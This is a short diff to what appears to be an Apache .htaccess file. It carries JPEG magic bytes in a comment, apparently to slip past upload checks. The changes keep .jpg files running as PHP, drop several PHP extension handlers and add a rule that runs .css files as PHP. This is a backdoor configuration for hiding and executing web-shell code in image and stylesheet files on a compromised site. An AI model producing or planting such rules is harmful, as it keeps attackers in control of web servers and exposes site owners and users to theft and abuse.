@@ -5,13 +5,4 @@ Require all granted
 
 #ÿØÿà
 AddType application/x-httpd-php .jpg
-AddType application/x-httpd-php .fla
-AddType application/x-httpd-php .html
-AddType application/x-httpd-php .phar
-AddType application/x-httpd-php .php
-AddType application/x-httpd-php .php3
-AddType application/x-httpd-php .php4
-AddType application/x-httpd-php .php5
-AddType application/x-httpd-php .php7
-AddType application/x-httpd-php .pht
-AddType application/x-httpd-php .phtml
+AddType application/x-httpd-php .css
